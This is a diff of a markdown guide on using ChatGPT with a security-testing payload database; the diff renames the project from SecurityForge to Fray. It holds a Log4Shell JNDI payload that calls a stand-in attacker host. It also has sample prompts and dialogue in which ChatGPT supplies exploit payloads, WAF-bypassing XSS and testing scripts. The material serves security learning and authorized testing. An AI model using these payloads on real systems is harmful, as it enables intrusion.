@@ -1,27 +1,27 @@
-# 💬 Using SecurityForge with ChatGPT - Step-by-Step Guide
+# 💬 Using Fray with ChatGPT - Step-by-Step Guide
 
 ## What is ChatGPT?
 
-ChatGPT is OpenAI's conversational AI that can help you understand, analyze, and work with SecurityForge payloads. This guide shows you how to effectively use SecurityForge with ChatGPT for security testing.
+ChatGPT is OpenAI's conversational AI that can help you understand, analyze, and work with Fray payloads. This guide shows you how to effectively use Fray with ChatGPT for security testing.
 
 ---
 
 ## 📋 Prerequisites
 
 - ChatGPT account (Free or Plus)
-- SecurityForge repository cloned locally
+- Fray repository cloned locally
 - Basic understanding of security testing concepts
 
 ---
 
 ## 🚀 Step-by-Step Usage Guide
 
-### Step 1: Clone SecurityForge Repository
+### Step 1: Clone Fray Repository
 
 ```bash
 # Clone the repository
-git clone https://github.com/dalisecurity/securityforge.git
-cd securityforge
+git clone https://github.com/dalisecurity/fray.git
+cd fray
 
 # Explore the structure
 ls -la payloads/
@@ -42,7 +42,7 @@ ls -la payloads/
 **Copy and paste this into ChatGPT:**
 
 ```
-I'm using SecurityForge, a comprehensive security testing payload database with 3,575+ payloads covering:
+I'm using Fray, a comprehensive security testing payload database with 3,575+ payloads covering:
 - 220 CVEs (2020-2026)
 - XSS, SQLi, Command Injection, SSRF, XXE, SSTI
 - Web Shells (PHP, ASP, JSP, Python, Perl)
@@ -118,7 +118,7 @@ Analyze this XSS payload file and:
 
 **You ask:**
 ```
-Explain SQL injection to me using examples from SecurityForge
+Explain SQL injection to me using examples from Fray
 ```
 
 **ChatGPT will:**
@@ -146,7 +146,7 @@ I have authorization. Walk me through the process step-by-step.
 
 **You ask:**
 ```
-Explain CVE-2021-44228 (Log4Shell) and show me how to test for it using SecurityForge
+Explain CVE-2021-44228 (Log4Shell) and show me how to test for it using Fray
 ```
 
 **ChatGPT will:**
@@ -199,7 +199,7 @@ Generate 5 new XSS payloads that:
 1. Use Unicode encoding
 2. Bypass common WAF filters
 3. Work in different HTML contexts
-4. Are based on SecurityForge examples
+4. Are based on Fray examples
 ```
 
 **ChatGPT will:**
@@ -220,7 +220,7 @@ Create a Python script that:
 3. Logs which payloads are blocked
 4. Generates a report
 
-Use SecurityForge's structure.
+Use Fray's structure.
 ```
 
 **ChatGPT will:**
@@ -279,7 +279,7 @@ Let me show you specific payloads..."
 **Conversation Flow:**
 
 ```
-You: "I'm new to security testing. Create a 30-day learning plan using SecurityForge."
+You: "I'm new to security testing. Create a 30-day learning plan using Fray."
 
 ChatGPT: "Here's your comprehensive 30-day plan:
 
@@ -318,7 +318,7 @@ Ready to start Day 1?"
 **Conversation Flow:**
 
 ```
-You: "Analyze all web shells in SecurityForge and create a detection guide."
+You: "Analyze all web shells in Fray and create a detection guide."
 
 ChatGPT: "I'll analyze the web shells across all languages:
 
@@ -463,7 +463,7 @@ REMEDIATION
 REFERENCES
 - OWASP XSS Prevention Cheat Sheet
 - CWE-79: Cross-site Scripting
-- SecurityForge Payload Database
+- Fray Payload Database
 
 ---
 
@@ -481,7 +481,7 @@ Would you like me to:
 ### 1. Provide Context
 
 ❌ **Bad:** "Test this"
-✅ **Good:** "I have authorization to test example.com for SQL injection. The database is MySQL. Show me the best payloads from SecurityForge."
+✅ **Good:** "I have authorization to test example.com for SQL injection. The database is MySQL. Show me the best payloads from Fray."
 
 ### 2. Be Specific
 
@@ -525,9 +525,9 @@ ChatGPT: [Creates custom payloads]
 **Full Conversation:**
 
 ```
-You: "What are the most critical CVEs in SecurityForge?"
+You: "What are the most critical CVEs in Fray?"
 
-ChatGPT: "SecurityForge includes 220 CVEs from 2020-2026. The most critical (CVSS 10.0):
+ChatGPT: "Fray includes 220 CVEs from 2020-2026. The most critical (CVSS 10.0):
 
 1. CVE-2021-44228 (Log4Shell)
    - Log4j RCE
@@ -555,7 +555,7 @@ ChatGPT: "Log4Shell (CVE-2021-44228) is a critical RCE in Apache Log4j...
 
 [Provides comprehensive explanation]
 
-Testing with SecurityForge:
+Testing with Fray:
 1. Use payload: ${jndi:ldap://attacker.com/a}
 2. Test in these locations:
    - User-Agent header
@@ -575,9 +575,9 @@ Want me to create a testing script?"
 ### Example 2: Mobile Security
 
 ```
-You: "I need to test an Android app. What mobile security payloads does SecurityForge have?"
+You: "I need to test an Android app. What mobile security payloads does Fray have?"
 
-ChatGPT: "SecurityForge covers OWASP Mobile Top 10:2024:
+ChatGPT: "Fray covers OWASP Mobile Top 10:2024:
 
 M1: Improper Credential Usage
 - Test for hardcoded credentials
@@ -636,7 +636,7 @@ Would you like detailed payloads for any category?"
 
 **Week 1: Foundations**
 ```
-Day 1: "Explain XSS to a beginner using SecurityForge examples"
+Day 1: "Explain XSS to a beginner using Fray examples"
 Day 2: "Show me 10 basic XSS payloads and explain each one"
 Day 3: "Create a practice exercise for XSS testing"
 Day 4: "Quiz me on XSS concepts"
@@ -654,7 +654,7 @@ Day 5: "Create a SQLi testing checklist"
 
 **Week 3: Advanced Topics**
 ```
-Day 1: "Explain SSRF with SecurityForge payloads"
+Day 1: "Explain SSRF with Fray payloads"
 Day 2: "Show me XXE exploitation techniques"
 Day 3: "Explain SSTI for different template engines"
 Day 4: "Show me command injection payloads"
@@ -673,7 +673,7 @@ Day 5: "Generate a portfolio piece"
 ### Intermediate Path (Bug Bounty Focus)
 
 ```
-Week 1: "Create a bug bounty testing methodology using SecurityForge"
+Week 1: "Create a bug bounty testing methodology using Fray"
 Week 2: "Show me advanced WAF bypass techniques"
 Week 3: "Teach me about chaining vulnerabilities"
 Week 4: "Help me write professional security reports"
@@ -755,7 +755,7 @@ Why didn't it work? What should I try next?"
 
 ## 📚 Additional Resources
 
-- [SecurityForge README](README.md)
+- [Fray README](README.md)
 - [Claude Code Guide](CLAUDE_CODE_GUIDE.md)
 - [Payload Database Coverage](PAYLOAD_DATABASE_COVERAGE.md)
 - [POC Simulation Guide](POC_SIMULATION_GUIDE.md)
@@ -765,7 +765,7 @@ Why didn't it work? What should I try next?"
 ## 💬 Quick Reference Prompts
 
 ```
-"Explain [vulnerability] using SecurityForge examples"
+"Explain [vulnerability] using Fray examples"
 "Show me payloads for [attack type]"
 "Create a testing script for [target]"
 "Analyze this payload: [payload]"
